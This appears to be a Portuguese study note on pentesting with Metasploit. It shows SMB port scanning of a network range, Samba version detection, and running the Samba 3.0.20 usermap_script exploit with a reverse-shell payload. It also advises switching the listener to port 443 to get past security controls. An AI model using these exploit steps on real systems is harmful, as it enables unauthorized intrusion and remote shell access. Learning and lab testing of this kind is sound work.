<h2 align="center">Coletando informacoes com Metasploit</h2>
<hr>

Vamos comecar a deixar nossos testes mais interessantes , fazendo levantamento de informacoes de um range de uma rede toda atraves do metasploit framework

```
db_nmap -p 139,445 --open -Pn -sS 172.18.1.0/24
hosts
services

```

Oque a gente poed fazer agora ? Uma vez que a gente esta enumerando as portas 139 e 445 a gente pode buscar algum modulo auxiliar  pra tentar detectar as versoes desses sistemas 

```sh
search type:auxiliary smb
use auxiliary/scanner/smb/smb_version
info
services -p 445 --rhosts
show options
run

hosts
vulns
hosts -i "Samba 3.0.20 Debian" <IP>
```

Inclusive se nos quisarmos buscar vulnerabilidads nessa versao do samba a gente poderia


```sh
search type:exploit fullname:"Samba 3.0.20"
info exploit/multi/samba/usermap_script
```

```sh
use exploit/multi/samba_usermap_script
show options
set rhost <IP>
info
exploit
```

Agora que exploramos a falha, note que apareceu uma outra informacao , que nao havia aparecido o campo `payload`

<mark style='background:var(--mk-color-red)'>Payload eh o codigo malicioso que voce vai executar</mark>  

```sh
show payloads 
show options
```

Normalmente portas altas como 4444 nao vai funcionar em um cenario real com os controles de seguranca por conta de ser uma porta estranha para o host estar se conectando mesmo sendo uma conexao reversa , nesse caso o ideal seria liberar a porta 80 ou 443

```
set LPORT 443
show options
exploit
```

```
set payload <payload>
```